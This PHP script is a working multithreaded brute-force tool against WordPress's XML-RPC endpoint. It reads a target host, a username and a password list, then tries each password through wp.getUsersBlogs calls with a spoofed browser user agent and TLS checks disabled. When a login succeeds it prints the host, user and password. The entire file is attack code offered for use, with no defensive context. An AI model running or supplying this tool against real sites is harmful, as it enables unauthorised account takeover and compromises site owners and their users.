<?php
/**
 *Created By RintoD :D
 *Wordpress XMLRPC BruteForce
 *Install Threads https://blog.programster.org/install-php-7-0-with-pthreads-on-ubuntu-16.04
*/
class Rintod extends Threaded{
  
  private $host;
  private $user;
  private $pass;
  private $type;
  private $ch;
  private $color = array();  
  public function __construct($host, $user, $pass){
    $this->host = $host;
    $this->user = $user;
    $this->pass = $pass;
    $this->color["green"] = "\033[0;32m";
    $this->color["red"] = "\033[0;31m";
    $this->color["blue"] = "\033[0;34m";
    $this->color["white"] = "\033[0m";
  }
  public function run(){
    $dataToPOST = "<?xml version=\"1.0\"?><methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{$this->user}</value></param>
    <param><value>{$this->pass}</value></param>
    </params>
    </methodCall>";
    $meh = array(
      CURLOPT_CONNECTTIMEOUT => 120,
      CURLOPT_TIMEOUT        => 120,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_FOLLOWLOCATION => false,
      CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
    );
    $this->ch = curl_init();
    curl_setopt_array($this->ch, $meh);
    curl_setopt($this->ch, CURLOPT_URL, $this->host."/xmlrpc.php");
    curl_setopt($this->ch, CURLOPT_POSTFIELDS, $dataToPOST);
    $output = curl_exec($this->ch);
    curl_close($this->ch);
    if(preg_match("/isAdmin/i", $output)){
      echo "{$this->color["blue"]}Trying With {$this->color["white"]}{$this->pass}{$this->color["green"]} Success...{$this->color["white"]}\n";
      system("clear");
      echo "{$this->color["blue"]}[!] Success Brute Force [!]{$this->color["white"]}\n";
      echo "Host: {$this->host}\n";
      echo "User: {$this->user}\n";
      echo "Pass: {$this->pass}\n";
      exit;
    }
    else{
      echo "{$this->color["blue"]}Trying With {$this->color["white"]}{$this->pass}{$this->color["red"]} Failed...{$this->color["white"]}\n";
    }
  }
}
$pool = new Pool(4);
echo "\033[0;34m[!] Wordpress XMLRPC Brute Force\n\033[0m";
echo "\033[0;34m[!] Please Put host without /xmlrpc.php :D\n\033[0m";
echo "\033[0;34m[!] Created By Con7ext\n\033[0m";
$host = readline("Put HOST: ");
$user = readline("Put User: ");
$pass = readline("Put List: ");
$pwd = explode("\n", file_get_contents($pass));
foreach($pwd as $pwds){
  $pool->submit(new Rintod($host, $user, $pwds));
}
while ($pool->collect());
$pool->shutdown();
